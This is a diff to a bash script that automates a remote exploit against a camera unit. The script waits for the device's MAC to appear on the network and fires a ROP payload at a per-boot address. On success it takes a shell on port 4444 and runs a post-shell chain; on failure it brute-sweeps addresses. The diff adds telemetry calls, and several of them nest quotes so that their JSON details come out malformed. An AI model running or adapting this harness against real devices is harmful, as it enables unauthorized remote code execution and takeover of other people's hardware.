@@ -18,6 +18,11 @@
 #       3 already fired this boot, 4 unit never appeared (with WATCH_DEADLINE set).
 set -u
 HERE="$(cd "$(dirname "$0")" && pwd)"
+TELEMETRY="$HERE/sweeper_telemetry.py"
+PY="${PY:-/opt/homebrew/bin/python3}"
+emit() { # emit <event> <details-json> — best-effort telemetry, never blocks the mission
+  [ -f "$TELEMETRY" ] && "$PY" "$TELEMETRY" emit --cam c460 --event "$1" --details "$2" >/dev/null 2>&1 || true
+}
 MAC="${MAC:-50:3d:d1:e3:e2:07}"
 # prefer the address the incremental sweeper found for THIS boot (ASLR shifts per boot)
 if [ -z "${ADDR:-}" ] && [ -r /tmp/c460_root_addr.txt ]; then
@@ -74,10 +79,10 @@ fi
 last=""
 while :; do
   if present; then
-    [ "$last" = up ] || { log "PRESENT"; last=up; }
+    [ "$last" = up ] || { log "PRESENT"; last=up; emit present '{"via":"poll"}'; }
     break
   fi
-  if [ "$last" != down ]; then log "absent (ARP or ICMP)"; last=down; fi
+  if [ "$last" != down ]; then log "absent (ARP or ICMP)"; last=down; emit absent '{"reason":"poll"}'; fi
   if [ "$deadline" != 0 ] && [ "$(date +%s)" -ge "$deadline" ]; then
     log "still absent after ${WATCH_DEADLINE} min — not fired"
     exit 4
@@ -88,6 +93,7 @@ done
 ip="$(resolve_ip)"
 [ -n "$ip" ] || { log "FATAL: present but the MAC resolved to no address"; exit 4; }
 log "unit $ip — gap ${GUARD_GAP}s, then one shot"
+emit fire "{"ip":"$ip","gap_s":${GUARD_GAP},"addr":"$ADDR"}"
 sleep "$GUARD_GAP"
 
 # state before the shot: a crash mid-fire must not produce a second payload
@@ -104,6 +110,7 @@ case "$out" in
   *"SHELL on"*)
     log "SHELL on $ip:4444 — running the post-shell chain"
     echo "shell $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
+    emit shell "{"ip":"$ip","outcome":"shell"}"
     "$POSTSHELL" "$ip" && exit 0
     log "post-shell chain FAILED (see /tmp/pane1/$ip)"
     exit 0
@@ -120,6 +127,7 @@ case "$out" in
 esac
 
 log "no shell at $ADDR — DECODE-BUFFER zone; sweeping to re-derive this boot's address"
+emit rop_result "{"outcome":"no-shell","addr":"$ADDR"}"
 echo "noshell $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
 # 16-shot hang sweep around the missed address (0x400 steps); a HANG hit pins the boot's stack.
 SW_OUT="$( "$PY" "$GUARD" brute --host "$ip" --mac "$MAC" --addr "$ADDR" --offset "$OFFSET" \
